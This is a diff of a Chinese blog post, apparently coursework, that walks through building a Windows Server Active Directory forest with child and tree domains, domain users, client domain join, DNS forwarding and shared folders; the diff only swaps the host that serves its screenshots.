-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648782.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648782.png" alt=""></p>
 <p>输入<strong>父域的</strong>账号密码</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648442.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648442.png" alt=""></p>
 <p>但是发现无法连接，点击”查看详细信息”看一下原因。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648571.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648571.png" alt=""></p>
 <p>原来是DNS服务器找不到父域，那直接把DNS服务器改成父域的服务器就好了。</p>
 <p>我们把Server-No2的DNS服务器改成Server-No1。</p>
 <p>先设置Server-No1的IP和DNS。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648151.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191648151.png" alt=""></p>
 <p>然后把Server-No2的DNS服务器改成Server-No1。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649832.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649832.png" alt=""></p>
 <p>点击”选择”，发现这次能搜索到了。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649231.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649231.png" alt=""></p>
 <p>选择”xuwp05191643.com”（父域）-“确定”。</p>
 <p>将新域名设置为a</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649462.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649462.png" alt=""></p>
 <p>连续”下一步”，直到”查看选项”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649202.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649202.png" alt=""></p>
 <p>a.xuwp05191643.com的PowerShell脚本。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 用于 AD DS 部署的 Windows PowerShell 脚本</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Import-Module</span> ADDSDeployment</span><br><span class="line"><span class="built_in">Install-ADDSDomain</span> `</span><br><span class="line"><span class="literal">-NoGlobalCatalog</span>:<span class="variable">$false</span> `</span><br><span class="line"><span class="literal">-CreateDnsDelegation</span>:<span class="variable">$true</span> `</span><br><span class="line"><span class="literal">-Credential</span> (<span class="built_in">Get-Credential</span>) `</span><br><span class="line"><span class="literal">-DatabasePath</span> <span class="string">&quot;C:\Windows\NTDS&quot;</span> `</span><br><span class="line"><span class="literal">-DomainMode</span> <span class="string">&quot;WinThreshold&quot;</span> `</span><br><span class="line"><span class="literal">-DomainType</span> <span class="string">&quot;ChildDomain&quot;</span> `</span><br><span class="line"><span class="literal">-InstallDns</span>:<span class="variable">$true</span> `</span><br><span class="line"><span class="literal">-LogPath</span> <span class="string">&quot;C:\Windows\NTDS&quot;</span> `</span><br><span class="line"><span class="literal">-NewDomainName</span> <span class="string">&quot;a&quot;</span> `</span><br><span class="line"><span class="literal">-NewDomainNetbiosName</span> <span class="string">&quot;A&quot;</span> `</span><br><span class="line"><span class="literal">-ParentDomainName</span> <span class="string">&quot;xuwp05191643.com&quot;</span> `</span><br><span class="line"><span class="literal">-NoRebootOnCompletion</span>:<span class="variable">$false</span> `</span><br><span class="line"><span class="literal">-SiteName</span> <span class="string">&quot;Default-First-Site-Name&quot;</span> `</span><br><span class="line"><span class="literal">-SysvolPath</span> <span class="string">&quot;C:\Windows\SYSVOL&quot;</span> `</span><br><span class="line"><span class="literal">-Force</span>:<span class="variable">$true</span></span><br></pre></td></tr></table></figure>
 <p>点击”下一步”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649781.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649781.png" alt=""></p>
 <p>点击”下一步”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649961.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649961.png" alt=""></p>
 <p>点击”关闭”，等待重启。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649583.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649583.png" alt=""></p>
 <p>基本上可以看出来配置AD成功了，再看一下系统属性。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649253.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649253.png" alt=""></p>
 <p>这表明成功创建了xuwp05191643.com的子域a.xuwp05191643.com，同时服务器Server-No2属于a.xuwp05191643.com。</p>
 <p>查看一下目前的AD域。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649881.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649881.png" alt=""></p>
 <p>点击”Active Directory域和信任关系”</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649962.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649962.png" alt=""></p>
 <p>在Server-No2中查看也是同样的结果，符合预期，配置完成。</p>
 <h3 id="Server-No3"><a href="#Server-No3" class="headerlink" title="Server-No3"></a>Server-No3</h3><h4 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h4><p>略</p>
 <h4 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h4><p>这次我们先修改DNS</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649422.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649422.png" alt=""></p>
 <p>点击”将此服务器提升为域控制器”后出现配置向导。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649671.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649671.png" alt=""></p>
 <p>点击”将新域添加到现有林”-“树域”。</p>
 <p>“更改”处仍使用xuwp05191643.com的凭据。</p>
 <p>连续”下一步”，直到”其他选项”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649174.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649174.png" alt=""></p>
 <p>这里的NetBIOS域名和xuwp05191643.com的NetBIOS域名重复了，所以向导在后面加了个0（这里最好还是换个名字，因为改起来很麻烦）。</p>
 <p>连续”下一步”，直到”查看选项”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649541.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649541.png" alt=""></p>
 <p>xuwp05191643.org的PowerShell脚本。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 用于 AD DS 部署的 Windows PowerShell 脚本</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Import-Module</span> ADDSDeployment</span><br><span class="line"><span class="built_in">Install-ADDSDomain</span> `</span><br><span class="line"><span class="literal">-NoGlobalCatalog</span>:<span class="variable">$false</span> `</span><br><span class="line"><span class="literal">-CreateDnsDelegation</span>:<span class="variable">$false</span> `</span><br><span class="line"><span class="literal">-Credential</span> (<span class="built_in">Get-Credential</span>) `</span><br><span class="line"><span class="literal">-DatabasePath</span> <span class="string">&quot;C:\Windows\NTDS&quot;</span> `</span><br><span class="line"><span class="literal">-DomainMode</span> <span class="string">&quot;WinThreshold&quot;</span> `</span><br><span class="line"><span class="literal">-DomainType</span> <span class="string">&quot;TreeDomain&quot;</span> `</span><br><span class="line"><span class="literal">-InstallDns</span>:<span class="variable">$true</span> `</span><br><span class="line"><span class="literal">-LogPath</span> <span class="string">&quot;C:\Windows\NTDS&quot;</span> `</span><br><span class="line"><span class="literal">-NewDomainName</span> <span class="string">&quot;xuwp05191643.org&quot;</span> `</span><br><span class="line"><span class="literal">-NewDomainNetbiosName</span> <span class="string">&quot;XUWP051916430&quot;</span> `</span><br><span class="line"><span class="literal">-ParentDomainName</span> <span class="string">&quot;xuwp05191643.com&quot;</span> `</span><br><span class="line"><span class="literal">-NoRebootOnCompletion</span>:<span class="variable">$false</span> `</span><br><span class="line"><span class="literal">-SiteName</span> <span class="string">&quot;Default-First-Site-Name&quot;</span> `</span><br><span class="line"><span class="literal">-SysvolPath</span> <span class="string">&quot;C:\Windows\SYSVOL&quot;</span> `</span><br><span class="line"><span class="literal">-Force</span>:<span class="variable">$true</span></span><br></pre></td></tr></table></figure>
 <p>点击”下一步”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649791.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649791.png" alt=""></p>
 <p>点击”安装”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649451.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649451.png" alt=""></p>
 <p>点击”关闭”，等待重启。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649896.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649896.png" alt=""></p>
 <p>登录界面</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649508.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649508.png" alt=""></p>
 <p>系统属性</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649336.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649336.png" alt=""></p>
 <p>AD域和信任关系。</p>
 <p>查看一下xuwp05191643.com的属性。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649631.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649631.png" alt=""></p>
 <p>配置完成。</p>
 <h3 id="一次尝试：使用Windows-Admin-Center配置AD"><a href="#一次尝试：使用Windows-Admin-Center配置AD" class="headerlink" title="一次尝试：使用Windows Admin Center配置AD"></a>一次尝试：使用Windows Admin Center配置AD</h3><p>Microsoft于2018年推出了Windows Admin<br>Center，这款正在开发的程序正在成为主流的服务器管理方式。</p>
 <p>最初我尝试着使用这款全新的工具，按照Microsoft的推荐在Server-No2和Server-No3上安装了无GUI的Windows<br>Server。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649177.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649177.png" alt=""></p>
 <p>安装完成后可以发现无GUI的Windows Server<br>2022只有一个PowerShell窗口，该版本开机后会自动进入SConfig程序，如下图。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649844.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649844.png" alt=""></p>
 <p>在Server-No1中打开Windows Admin<br>Center，输入服务器名Server-No2即可轻松地与其建立连接。同样地，点击”角色和功能”，可以在其中安装Active<br>Directory域服务。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649302.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191649302.png" alt=""></p>
 <p>另外，还可以使用远程桌面连接Server-No2。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650452.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650452.png" alt=""></p>
 <p>但是Windows Admin<br>Center目前还没有集成对其的配置功能，该功能目前仍作为一个扩展插件被开发，我们可以手动安装它。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650389.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650389.png" alt=""></p>
 <p>但遗憾的是这个插件目前只能在作为域控制器的服务器上查看。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650073.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650073.png" alt=""></p>
 <p>因为AD配置功能仍在开发，Windows Admin Center目前还没有像Windows Server<br>Manager一样强大的功能，但我相信这样的集大成者在不久后定会成为主流，不负安装系统时的推荐二字。</p>
 <h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><p>先试一下Desktop版添加用户的方式，打开本地用户和组。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650751.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650751.png" alt=""></p>
 <p>行不通，按它说的在”Active Directory用户和计算机”中添加试试。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650323.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650323.png" alt=""></p>
 <p>右击”xuwp05191643.com”，点击”新建”-“组织单元”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650642.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650642.png" alt=""></p>
 <p>右击”Client Users”，点击”新建”-“组”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650169.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650169.png" alt=""></p>
 <p>右击”Client Users”，点击”新建”-“用户”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650521.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650041.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650532.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650521.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650041.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650532.png" alt=""></p>
 <p>这里为了区分各Server的用户，我在”英文缩写”处做了一个标识”-Nox”。</p>
 <p>注：在实际生产环境中最好勾选”用户下次登录时须更改密码”，这里我勾选了，后面可以看到需要更改密码才能登录进去，后两个用户就不勾了。</p>
 <p>同样的步骤，在Server-No2和Server-No3中操作一遍，有：</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650752.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650422.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650752.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650422.png" alt=""></p>
 <h2 id="登录客户机"><a href="#登录客户机" class="headerlink" title="登录客户机"></a>登录客户机</h2><h3 id="配置-3"><a href="#配置-3" class="headerlink" title="配置"></a>配置</h3><p>首先要将客户机加入到我们创建的AD林中。</p>
 <p>首先改DNS</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650902.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650902.png" alt=""></p>
 <p>在”系统属性”中加入域即可。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650473.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650473.png" alt=""></p>
 <p>输入xuwp05191643.com的凭据</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650892.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650461.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650892.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650461.png" alt=""></p>
 <p>加入成功。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650622.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650622.png" alt=""></p>
 <p>重启后查看”系统属性”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650661.png" alt=""></p>
-<h3 id="登录xuwp-No1"><a href="#登录xuwp-No1" class="headerlink" title="登录xuwp-No1"></a>登录xuwp-No1</h3><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650221.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650661.png" alt=""></p>
+<h3 id="登录xuwp-No1"><a href="#登录xuwp-No1" class="headerlink" title="登录xuwp-No1"></a>登录xuwp-No1</h3><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650221.png" alt=""></p>
 <p>因为我们之前勾选了”用户下次登录时须更改密码”，所以这里系统要求我们更改密码后进入。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650441.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650941.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650441.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650941.png" alt=""></p>
 <p>使用新密码登录系统后，出现和初始化系统相同的界面。</p>
 <p>最后，使用whoami命令确定域和用户。</p>
 <p><img src="C:/Users/XuWanpeng/Desktop/docx_to_markdown-main/images/05191643-%E8%AE%B8%E4%B8%87%E9%B9%8F-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E4%BD%9C%E4%B8%9A%E4%B8%809efe51b1-6c2b-4f90-9733-a3f839a299d1/media/image61.png" alt=""></p>
-<h3 id="登录xuwp-No2"><a href="#登录xuwp-No2" class="headerlink" title="登录xuwp-No2"></a>登录xuwp-No2</h3><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650774.png" alt=""></p>
+<h3 id="登录xuwp-No2"><a href="#登录xuwp-No2" class="headerlink" title="登录xuwp-No2"></a>登录xuwp-No2</h3><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650774.png" alt=""></p>
 <p>根据下面”如何登录到其他域？”的提示，我们使用域名\域用户名的格式登录。（这实际上是Windows<br>2000以前版本的登录方式，目前应该使用域用户名\@域名）。</p>
 <p>这里不需要更改密码，等待初始化系统后使用whoami确定域和用户。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650360.png" alt=""></p>
-<h3 id="登录xuwp-No3"><a href="#登录xuwp-No3" class="headerlink" title="登录xuwp-No3"></a>登录xuwp-No3</h3><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191652672.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650360.png" alt=""></p>
+<h3 id="登录xuwp-No3"><a href="#登录xuwp-No3" class="headerlink" title="登录xuwp-No3"></a>登录xuwp-No3</h3><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191652672.png" alt=""></p>
 <p>发现登录不上，我们ping一下Server-No3试试。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650872.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650872.png" alt=""></p>
 <p>发现DNS无法解析，那就对xuwp05191643.com设置一个xuwp05191643.org的IP转发。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650151.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650151.png" alt=""></p>
 <p>点击”工具”-“DNS”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650721.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191650721.png" alt=""></p>
 <p>右击”条件转发器”-“新建条件转发器”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651791.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651791.png" alt=""></p>
 <p>输入”DNS域”和”主服务器的IP地址”，点击”确定”。</p>
 <p>注：这里虽然提示了一个”验证服务器时出现了一个未知错误”，但其实并无大碍。</p>
 <p>再试着ping一下Server-No3。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651681.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651681.png" alt=""></p>
 <p>可以解析了，再次登录一下。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651933.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651933.png" alt=""></p>
 <p>这次可以登录成功了，使用whoami确定域和用户。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651653.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651653.png" alt=""></p>
 <h2 id="共享资源"><a href="#共享资源" class="headerlink" title="共享资源"></a>共享资源</h2><p>共享资源有几种方式，但都差不太多。</p>
 <h3 id="设置共享文件夹"><a href="#设置共享文件夹" class="headerlink" title="设置共享文件夹"></a>设置共享文件夹</h3><h4 id="高级共享"><a href="#高级共享" class="headerlink" title="高级共享"></a>高级共享</h4><p>右击想要共享的文件夹-“属性”-“共享”-“高级共享”-“共享此文件夹”-“权限”-允许读取/更改-“确定”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651156.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651156.png" alt=""></p>
 <p>注意这种方式是共享给”Everyone”的，林中的所有用户都可以发现共享文件夹。</p>
 <h4 id="共享"><a href="#共享" class="headerlink" title="共享"></a>共享</h4><p>右击想要共享的文件夹-“属性”-“共享”-下拉箭头-“查找个人”-“位置”</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651380.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651380.png" alt=""></p>
 <p>选中”整个目录”。</p>
 <p>然后我们就可以搜索我们的3个Administrator和3个XuWanpeng-Nox了。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651680.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651680.png" alt=""></p>
 <p>选中他们，点击”确定”。</p>
 <p>将6个用户全部加入后如图。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651522.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651522.png" alt=""></p>
 <p>点击”确定”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651992.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651992.png" alt=""></p>
 <p>最后将他们权限级别全部改为”读取/写入”。</p>
 <p>注：这种方式也可以实现对”Everyone”的共享，这个选项也在下拉菜单中。</p>
 <h4 id="在Active-Directory上发布共享文件夹"><a href="#在Active-Directory上发布共享文件夹" class="headerlink" title="在Active Directory上发布共享文件夹"></a>在Active Directory上发布共享文件夹</h4><p>有的时候我们不希望整个网络的主机都发现我们的共享文件夹，我们现在试着将文件夹发布到自己所在的AD上。</p>
 <p>首先，使用前两节的方法将其设置为共享文件夹。</p>
 <p>接着，打开”计算机管理”（compmgmt.msc）-“共享文件夹”-“共享”-右击”Server-No1-ADShare”-“属性”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651672.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651672.png" alt=""></p>
 <p>点击”将这个共享在Active<br>Directory中发布”，并为其设置一个关键字即可发布到主机所在AD上，我们在5.2.2节演示怎样使用这些共享文件夹。</p>
 <h3 id="查看共享文件夹"><a href="#查看共享文件夹" class="headerlink" title="查看共享文件夹"></a>查看共享文件夹</h3><h4 id="在网络中发现共享文件"><a href="#在网络中发现共享文件" class="headerlink" title="在网络中发现共享文件"></a>在网络中发现共享文件</h4><p>设置好共享文件夹后，系统会生成一个网络路径，如</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651451.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651451.png" alt=""></p>
 <p>林中的计算机使用这个路径后都可以查看共享文件夹。但是我们并不能<strong>发现</strong>它，这要怎么办呢？</p>
 <p>一个朴素的想法就是在”控制面板”-“网络和Internet”-“网络和共享中心”-“高级共享设置”中”启用网络发现”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191652712.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191652712.png" alt=""></p>
 <p>但我们发现这个选项点不开，关闭页面后又会变回去。</p>
 <p>更简单的方法是在”服务”（services.msc）中把”Function Discovery Resource<br>Publication”服务打开。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651711.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651064.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651711.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651064.png" alt=""></p>
 <p>FDResPub服务的作用是：发布该计算机以及连接到该计算机的资源，以便能够在网络上发现这些资源。如果该服务被停止，将不再发布网络资源，网络上的其他计算机将无法发现这些资源。</p>
 <p>然后我们就可以在”网络”中发现共享文件夹了。</p>
 <p>事实上”启用网络发现”这个选项也是可以打开的，需要用上述方式打开”Function<br>Discovery Resource Publication”服务、”SSDP Discovery”服务、”UPnP Device<br>Host”服务，然后这个选项就永久打开了（推荐这种方式）。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651082.png" alt=""></p>
